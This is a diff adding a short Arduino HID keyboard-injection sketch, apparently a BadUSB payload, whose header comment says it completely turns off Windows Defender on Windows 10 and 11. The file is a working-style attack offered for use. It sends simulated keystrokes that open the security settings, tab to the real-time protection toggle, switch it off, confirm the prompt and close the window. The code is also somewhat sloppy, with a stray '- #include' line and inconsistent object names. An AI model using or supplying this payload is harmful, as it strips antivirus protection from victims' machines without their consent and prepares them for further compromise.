@@ -1,0 +1,73 @@
+// With this payload we're going to completly turn off Widnows Defender. This works for Windows 10 and Windows 11
+
+
+- #include <HIDKeyboard.h>
+
+HIDKeyboard keyboard; // Initialize HIDKeyboard object
+
+void setup() {
+keyboard.begin(); // Start communication
+delay(200);
+delay(10);
+keyboard.pressSpecialKey(GUI); // Press the GUI (Windows) key
+keyboard.releaseKey(); // Release the GUI key
+
+delay(700); // Wait for the Start Button to open
+keyboard.print("Antivi"); 
+
+delay(700); // Wait for the run dialog to come up
+keyboard.pressSpecialKey(ENTER); 
+keyboard.releaseKey();
+
+delay(700);
+keyboard.pressSpecialKey(TAB);//1
+keyboard.releaseKey();
+
+delay(700);
+keyboard.pressSpecialKey(TAB);//2
+keyboard.releaseKey();
+
+delay(700);
+keyboard.pressSpecialKey(TAB);//3
+keyboard.releaseKey();
+
+delay(700);
+keyboard.pressSpecialKey(TAB); //4
+keyboard.releaseKey();
+
+delay(700);
+keyboard.pressSpecialKey(ENTER); //
+keyboard.releaseKey();
+
+delay(700);
+keyboard.pressKey(' '); // Presiona la tecla de espacio
+delay(1000); // Espera un segundo (ajusta el tiempo según sea necesario)
+keyboard.releaseKey(); // Suelta la tecla de espacio después de un segundo
+
+delay(900);
+keyboard.pressKey(44); //
+keyboard.releaseKey();
+
+delay(700);
+keyboard.pressSpecialKey(TAB); //2
+keyboard.releaseKey();
+
+delay(1000);
+keyboard.pressSpecialKey(TAB); //3
+keyboard.releaseKey();
+
+delay(700);
+keyboard.pressSpecialKey(ENTER); //
+keyboard.releaseKey();
+
+Keyboard.pressKey((ALT), F4); // Presiona Alt + F4
+delay(700); // Pequeño retraso para asegurarse de que la combinación de teclas se active correctamente
+Keyboard.releaseKey(); // Suelta las teclas
+
+delay(10);
+
+}
+
+void loop() {
+
+}
